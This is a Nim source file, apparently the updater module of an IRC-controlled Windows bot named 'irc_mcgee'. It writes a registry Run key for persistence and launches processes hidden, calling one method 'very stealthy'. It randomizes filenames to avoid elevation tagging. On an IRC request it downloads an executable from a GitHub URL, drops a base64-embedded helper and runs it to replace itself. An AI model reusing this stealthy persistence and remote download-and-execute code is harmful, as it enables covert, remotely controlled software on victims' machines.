import configparser, os, irc, base64, helper_base64, winim/inc/wininet, winim, random, std/widestrs, asyncdispatch

## Bake current version into the executable, runs at compile time
const current_version* = readFile("./update/update.ini").parseIni().getProperty("Version","Version")

var
    g_tmp_clean* = false
    g_dbg = true
    g_first_run* = true


## Silently launches a process
## The update helper specifially
proc launchProcess(command: string): bool =
  var
    si: STARTUPINFO
    pi: PROCESS_INFORMATION
  let cmd: string = command

  ZeroMemory(addr si, sizeof(si))
  si.cb = sizeof(si)
  ZeroMemory(addr pi, sizeof(pi))

  if CreateProcess(nil, cmd, nil, nil, false, CREATE_NO_WINDOW, nil, nil, addr si, addr pi):
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    result = true
  else:
    result = false



# Used as a method to check if a program is running
# particularly the update helper. If the update helper is running, the main program can terminate so the update can proceed
proc getProcessIdByName(processName: string): DWORD =
    const bufferSize = 1024
    var processIds: array[bufferSize, DWORD]
    var bytesReturned: DWORD
    var processCount: DWORD

    # Get the list of all process IDs
    if not (EnumProcesses(addr processIds[0], sizeof(DWORD) * bufferSize, addr bytesReturned) != 0):
        #echo "memory: EnumProcesses failed"
        raiseOSError(cast[OSErrorCode](1),"EnumProcesses failed")

    # Calculate the number of processes in the list
    processCount = bytesReturned div sizeof(DWORD)
    #echo "memory: process count [" & intToStr(processCount) & "]"
    
    # Iterate through the list and find the process with the given name

    
    var hProcess:HANDLE = 0
    for i in 0 ..< processCount:
        var buffer: array[bufferSize, char]
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, false, processIds[i])
        if hProcess != 0:
            if GetModuleFileNameEx(hProcess, 0, cast[LPTSTR](addr buffer[0]), sizeof(buffer)) != 0:
                var
                    exeName:string = ""
                    tmp_exeName:string = "" 
                    j = 0 
                while buffer[j] != char(0):
                    tmp_exeName = tmp_exeName & char(buffer[j])
                    inc(j)
                    inc(j)

                var (_,name,ext) = splitFile(tmp_exeName)
                exeName = name & ext


                # Check if the executable file name matches the desired process name
                if exeName == processName:
                    if g_dbg: echo "memory: process found! [" & exeName & "]"
                    CloseHandle(hProcess)
                    hProcess = 0
                    return processIds[i]
        else:                
            #echo "memory: could not open process "
            CloseHandle(hProcess)
            hProcess = 0

    if g_dbg: echo "memory: no process with that name found"
    CloseHandle(hProcess)
    return 0




## Needed to create a link in the startup folder (old)
# proc createShortcut(targetPath: string, shortcutPath: string) =
#   var shellLink: ptr IShellLink
#   var persistFile: ptr IPersistFile
#   var hr: HRESULT

#   hr = CoInitialize(nil)
#   if hr != S_OK and hr != S_FALSE:
#     raise newException(OSError, "Failed to initialize COM")

#   hr = CoCreateInstance(
#     addr CLSID_ShellLink, nil, CLSCTX_INPROC_SERVER, addr IID_IShellLink,
#     cast[ptr pointer](addr shellLink)
#   )

#   if hr != S_OK:
#     CoUninitialize()
#     raise newException(OSError, "Failed to create shell link")

#   shellLink.SetPath(targetPath)

#   hr = shellLink.QueryInterface(addr IID_IPersistFile, cast[ptr pointer](addr persistFile))
#   if hr != S_OK:
#     shellLink.Release()
#     CoUninitialize()
#     raise newException(OSError, "Failed to get IPersistFile")

#   persistFile.Save(shortcutPath, true)
#   persistFile.Release()
#   shellLink.Release()
#   CoUninitialize()




# Creates a key in the registry to autorun the program
# Startup folder just causes nagging by windows defener
# I don't think anyone uses that anyway
proc updt_createStartupShortcut*() =
    #### USING STARTUP FOLDER (old)
    var 
         (_, name, _) = splitFile(getAppFilename())
    #     startup_fullpath = getEnv("APPDATA") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" & name & ".lnk"
    # if fileExists(startup_fullpath):
    #     removeFile(startup_fullpath)
    # createShortcut(getAppFilename(), startup_fullpath)

    #### USING REGISTRY
    var key: HKEY
    var result: LONG

    result = RegOpenKeyEx(
        HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, addr key
    )
    
    var 
        full_path:string = "\"" & getAppFilename() & "\""
        full_pathW = newWideCString(full_path)

    if result == ERROR_SUCCESS:
        # RegSetValueEx(
        # key, name, 0, REG_SZ, cast[LPBYTE](addr full_path[0]),
        # (full_path.len + 1).DWORD
        # )


        
        RegSetValueEx(key, name, 0, REG_SZ, cast[ptr BYTE](addr(full_pathW[0])), len(full_pathW)*sizeof(WCHAR))
        RegCloseKey(key)
    else:
        discard
        # Handle error



# Downloads website content (works for text and files)
proc updt_fetchWebsiteContent(url: string): string =
  var
    hInternet, hConnect: HINTERNET
    buffer: array[1024, char]
    bytesRead: ULONG
    content: string = ""

  # Initialize WinINet
  hInternet = InternetOpen("MyApp", INTERNET_OPEN_TYPE_DIRECT, nil, nil, 0)
  if hInternet.isNil:
    return "Failed to initialize WinINet."

  # Open a connection to the URL
  hConnect = InternetOpenUrl(hInternet, url, nil, 0, INTERNET_FLAG_RELOAD, 0)
  if hConnect.isNil:
    InternetCloseHandle(hInternet)
    return "Failed to open URL."

  # Read the content and append it to the 'content' string
  while bool(InternetReadFile(hConnect, addr(buffer), sizeof(buffer), addr(bytesRead))) and (bytesRead > 0):
    for i in 0..<bytesRead:
        content &= buffer[i]

  # Close handles
  InternetCloseHandle(hConnect)
  InternetCloseHandle(hInternet)

  return content


proc updt_clearTemp*() {.async.} =
    var
        tmpdir = getTempDir() & "irc_mcgee\\"
    try:
        if dirExists(tmpdir):
            removeDir(tmpdir)
    except:
        discard


## Checks for updates and conducts them
proc updt_check*(respond_to_caller:bool = false, iclient:AsyncIrc, ievent:IrcEvent, force:bool):Future[bool] {.async.} =
    var
        #client = newHttpClient()
        #clientconnected = true
        ini_raw:string


    if g_dbg: echo "UPDATER: getting info"


    try:
        ## Filenames are slightly randomize because sometimes they get tagged to require elevation otherwise
        randomize()

        var
            tmpdir = getTempDir() & "irc_mcgee\\"
            tmpexe_firsthalf = tmpdir & "irc_mcupdated"
            a_very_random_number:string = $(rand(10000..99999))
            tmpexe = tmpexe_firsthalf & a_very_random_number & ".exe"

        ## Cleanup any leftovers from last update
        ## await updt_clearTemp()


        ## Try to see what the current version is
        try:
            ini_raw = updt_fetchWebsiteContent("https://raw.githubusercontent.com/crackman2/irc_mcgee/master/update/update.ini")
        except OSError as e:
            if (respond_to_caller) and not force:
                discard iclient.privmsg(ievent.origin, "could not get the content of update.ini [" & repr(e) & "]")
            return
        var
            ini = parseIni(ini_raw)
            ini_version = ini.getProperty("Version","Version")
        
        ## Compare current version with the one online, so we know if we need to update
        if ini_version == current_version:
            if g_dbg: echo " +-> version is up to date [",ini_version,"]"
            if(respond_to_caller):
                discard iclient.privmsg(ievent.origin, "up to date (mine)[" & current_version & "] vs (online)[" & ini_version & "]")
            return true
        elif(respond_to_caller):
            discard iclient.privmsg(ievent.origin, "attempting to update, cya")
        if g_dbg: echo " +-> update required. [",current_version,"] -> [", ini_version, "]"
    

        ## Create temporary directory to store the latest version of the main executable and also the update helper
        try:
            if not dirExists(tmpdir):
                createDir(tmpdir)
        except:
            if g_dbg: echo " +-> failed to create temp dir"
            if(respond_to_caller):
                discard iclient.privmsg(ievent.origin, "failed to create temp dir")
            return
        if g_dbg: echo " +-> getting file"


        ## Download main executable and save in the temp directory
        try:
            var data_tmpexe = updt_fetchWebsiteContent("https://github.com/crackman2/irc_mcgee/raw/master/update/irc_mcgee.exe")
            writeFile(tmpexe,data_tmpexe)
        except OSError as e:
            if g_dbg: echo " +-> downloading file failed"
            if(respond_to_caller):
                discard iclient.privmsg(ievent.origin, "failed to download main executable [" & repr(e) & "]")
            return
        

        ## Upon sucess we unpack the update helper
        if fileExists(tmpexe):
            if g_dbg: echo " +-> download successful"
            var
                tmpbat_firsthalf = tmpdir & "irc_mchelper"
                tmpbat = tmpbat_firsthalf & a_very_random_number & ".exe"

            writeFile(tmpbat,base64.decode(helper_b64))



            ##### OLD OLD OLD OLD OLD OLD OLD OLD OLD #####
            # writeFile(tmpbat,
            #     "@echo off\n" &
            #     "timeout /t 1 /nobreak > NUL\n" &
            #     "del " & getAppFilename() & " /f /q\n" &
            #     "copy /Y " & tmpexe & " " & getAppFilename() & " > NUL\n" &
            #     "cls\ntitle \".\"\n" &
            #     "start /B " & getAppFilename() & "\nexit"
            # )
            # discard execShellCmd("start /B " & tmpbat)
            ##### OLD OLD OLD OLD OLD OLD OLD OLD OLD #####


            await sleepAsync(500)
            var
                (_, name, ext) = splitFile(tmpbat)
                tmpbat_filename_only = name & ext
                first = true
                current_method = 1
                max_methods = 2

            ## Attempt to launch the update helper (this must happen, otherwise no patching can be done, the program will get stuck here
            ## if this fails)
            ## The first method is likely to work and is also very stealthy
            ## The second method is also reliable but very noticable (flashes command prompt)
            while getProcessIdByName(tmpbat_filename_only) == 0:
                if not first:
                    first = false
                else:
                    echo "Process did not start properly. Trying again: "

                echo "Starting the patcher using method: [", current_method, "]"
                ## discard startProcess(tmpbat, args = ["\"" & getAppFilename() & "\"", a_very_random_number]) ## THIS DOES NOT START IT PROPERLY

                case current_method:
                # of 1:
                #     discard startProcess("cmd.exe",args = ["/C start /B " & tmpbat & " \"" & getAppFilename() & "\" " & $a_very_random_number])
                # of 2:
                #     discard startProcess(tmpbat, args = ["\"" & getAppFilename() & "\"", a_very_random_number])
                of 1:
                    discard launchProcess(tmpbat & " \"" & getAppFilename() & "\" " & $a_very_random_number)
                of 2:
                    discard execShellCmd("start /B " & tmpbat & " \"" & getAppFilename() & "\" " & $a_very_random_number)
                else:
                    echo "This is all just terrible"

                inc(current_method)
                if current_method > max_methods: current_method = 1
                sleep(1000)
            ## Terminate outselves
            echo "time to go ,2seconds"
            sleep(2000)
            quit(0)

    except OSError as e:
        if g_dbg: echo " +-> update failed"
        if(respond_to_caller):
                discard iclient.privmsg(ievent.origin, "failed to on a very deep level [" & repr(e) & "]")